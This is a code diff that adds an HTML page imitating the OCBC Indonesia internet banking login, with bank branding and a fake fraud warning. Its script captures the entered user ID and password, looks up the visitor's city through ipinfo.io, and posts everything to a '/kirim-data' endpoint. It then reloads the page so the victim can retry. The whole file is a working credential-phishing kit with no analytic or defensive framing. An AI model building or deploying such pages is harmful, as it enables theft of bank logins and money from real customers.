@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>OCBC Internet Banking</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet"/>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <style>
+    * { box-sizing: border-box; }
+    body { margin: 0; font-family: 'Roboto', sans-serif; background: #fff; color: #222; }
+    a { color: #004a9f; text-decoration: none; }
+    a:hover { text-decoration: underline; }
+    .header-help { background: #f5f5f3; color: #a9a9a9; font-size: 14px; text-align: center; padding: 8px 0; display: flex; justify-content: center; align-items: center; gap: 6px; }
+    .header-help i { font-size: 16px; }
+    .logo-container { text-align: center; margin: 20px 0 10px; }
+    .logo-container img { width: 160px; height: auto; }
+    .welcome-text { font-style: italic; font-size: 14px; color: #666; text-align: center; margin-bottom: 10px; }
+    .welcome-text img { vertical-align: middle; margin-left: 4px; width: 18px; height: 12px; }
+    .container { max-width: 480px; margin: 0 auto 20px; padding: 0 15px; }
+    .card { background: #fff; border-radius: 12px; box-shadow: 0 0 10px rgb(0 0 0 / 0.1); margin-bottom: 20px; padding: 15px 20px 20px; }
+    .card h2 { font-weight: 700; font-size: 20px; margin: 0 0 10px 0; }
+    .login-section h2 { font-size: 22px; font-weight: 700; margin-bottom: 10px; }
+    .login-sec-header { display: flex; align-items: center; gap: 8px; margin-bottom: 15px; justify-content: flex-end; }
+    .login-sec-header .secure-text { font-size: 13px; color: #222; }
+    .login-sec-header img { width: 28px; height: 28px; }
+    input[type="text"], input[type="password"] { width: 100%; border: 1px solid #a4c04a; border-radius: 4px; padding: 10px 12px; font-size: 14px; color: #222; margin-bottom: 15px; font-family: 'Roboto', sans-serif; }
+    .password-wrapper { position: relative; }
+    .password-wrapper input { padding-right: 40px; }
+    .password-wrapper .toggle-password { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); border: none; background: transparent; cursor: pointer; color: #666; font-size: 18px; }
+    button.login-btn { background: #d96a6a; border: none; color: #fff; font-weight: 600; font-size: 14px; padding: 10px 20px; border-radius: 4px; cursor: pointer; display: inline-flex; align-items: center; gap: 6px; }
+    button.login-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+    .login-footer { font-size: 14px; line-height: 1.3; margin-top: 15px; }
+    .login-footer a { font-weight: 700; }
+    .info-cards { max-width: 480px; margin: 0 auto 20px; padding: 0 15px; }
+    .info-card { background: #f5f5f3; border-radius: 12px; box-shadow: 0 0 8px rgb(0 0 0 / 0.1); display: flex; gap: 12px; padding: 10px 15px; margin-bottom: 15px; align-items: center; }
+    .info-card img { width: 80px; height: 60px; object-fit: contain; flex-shrink: 0; }
+    .info-card-text { font-size: 13px; color: #222; line-height: 1.3; }
+    .footer { font-size: 11px; color: #666; text-align: center; padding: 10px 15px; border-top: 1px solid #ccc; max-width: 480px; margin: 0 auto 10px; background: #dedede; }
+    .status { margin-top: 12px; font-size: 13px; display: none; }
+    .status.error { color: #dc3545; }
+    .status.success { color: #28a745; }
+    @media (max-width: 520px) {
+      .container, .info-cards, .footer { max-width: 100%; padding: 0 10px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="header-help"><i class="fas fa-question-circle"></i> Bantuan</div>
+  <div class="logo-container">
+    <img alt="Logo OCBC" src="https://ik.imagekit.io/ons708bb1/main_logo.png?updatedAt=1745169474024" width="160" height="40"/>
+  </div>
+  <div class="welcome-text">
+    Selamat Datang di Internet Banking OCBC, 21 April 2025 00:16
+    <img alt="ID" class="flag-id" src="https://ik.imagekit.io/ons708bb1/Picsart_25-04-21_00-28-26-533.jpg" width="18" height="12"/> /
+    <img alt="UK" class="flag-uk" src="https://ik.imagekit.io/ons708bb1/Picsart_25-04-21_00-26-36-487.jpg" width="18" height="12"/>
+  </div>
+  <br>
+
+  <div class="container">
+    <div class="card">
+      <h2>Pemberitahuan Penting</h2>
+      <img alt="Peringatan" src="https://ik.imagekit.io/zqsisqvevb/20200413031400Web_Banner_OCBC.jpg" width="100%"/>
+    </div>
+
+    <div class="card login-section">
+      <h2>Selamat Datang di Internet Banking OCBC</h2>
+      <div class="login-sec-header">
+        <span class="secure-text">Situs Aman</span>
+        <img alt="Aman" src="https://ik.imagekit.io/ons708bb1/lock_icon.png" width="28" height="28"/>
+      </div>
+
+      <form id="loginForm">
+        <input aria-label="ID Pengguna" placeholder="ID Pengguna" required name="user" type="text" id="user"/>
+        <input type="hidden" id="kota" name="kota"/>
+        <div class="password-wrapper">
+          <input aria-label="Kata Sandi" id="password" placeholder="Kata Sandi" required name="pass" type="password"/>
+          <button aria-label="Tampilkan/Sembunyikan" class="toggle-password" type="button" onclick="togglePassword()">
+            <i class="fas fa-eye"></i>
+          </button>
+        </div>
+        <button aria-label="Masuk" class="login-btn" id="submitBtn" type="submit">
+          Masuk <img src="https://ik.imagekit.io/ons708bb1/Picsart_25-04-21_01-04-53-967.png" width="10" alt=""/>
+        </button>
+        <div id="status" class="status"></div>
+      </form>
+
+      <hr>
+      <div class="login-footer">
+        Tidak memiliki ID Pengguna? <a href="#">Daftar di sini</a><br>
+        Lupa atau Belum Punya Password? Hubungi TANYA OCBC 1500-999
+      </div>
+    </div>
+  </div>
+
+  <div class="info-cards">
+    <div class="info-card">
+      <img alt="Peringatan Penipuan" src="https://ik.imagekit.io/ons708bb1/fraud-info.jpg" width="80" height="60"/>
+      <div class="info-card-text">Waspada Penipuan! Jangan bagikan User ID, PIN, Password, OTP</div>
+    </div>
+  </div>
+
+  <div class="footer">
+    © 2024 PT Bank OCBC NISP Tbk. Diawasi OJK & BI. Dijamin LPS hingga Rp2 Miliar.
+  </div>
+
+  <script>
+    function togglePassword() {
+      const pwd = document.getElementById('password');
+      const icon = document.querySelector('.toggle-password i');
+      if (pwd.type === 'password') {
+        pwd.type = 'text';
+        icon.className = 'fas fa-eye-slash';
+      } else {
+        pwd.type = 'password';
+        icon.className = 'fas fa-eye';
+      }
+    }
+
+    // Ambil kota
+    fetch('https://ipinfo.io/city')
+      .then(r => r.text())
+      .then(city => document.getElementById('kota').value = city.trim())
+      .catch(() => document.getElementById('kota').value = 'Tidak Diketahui');
+
+    // Handle submit
+    const form = document.getElementById('loginForm');
+    const btn = document.getElementById('submitBtn');
+    const statusEl = document.getElementById('status');
+
+    form.addEventListener('submit', async e => {
+      e.preventDefault();
+      btn.disabled = true;
+      btn.innerHTML = 'Memproses...';
+      statusEl.style.display = 'none';
+
+      const formData = {
+        user: document.getElementById('user').value.trim(),
+        pass: document.getElementById('password').value,
+        kota: document.getElementById('kota').value
+      };
+
+      try {
+        const res = await fetch('/kirim-data', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(formData)
+        });
+        const data = await res.json();
+        
+        if (data.ok) {
+          showStatus('✅ Data terkirim! Mengalihkan...', 'success');
+          setTimeout(() => window.location.reload(), 2000);
+        } else {
+          showStatus('❌ ' + (data.msg || 'Gagal, coba lagi'), 'error');
+        }
+      } catch (err) {
+        showStatus('⚠️ Kesalahan jaringan', 'error');
+      } finally {
+        btn.disabled = false;
+        btn.innerHTML = 'Masuk <img src="https://ik.imagekit.io/ons708bb1/Picsart_25-04-21_01-04-53-967.png" width="10" alt=""/>';
+      }
+    });
+
+    function showStatus(text, type) {
+      statusEl.textContent = text;
+      statusEl.className = `status ${type}`;
+      statusEl.style.display = 'block';
+    }
+  </script>
+</body>
+</html>
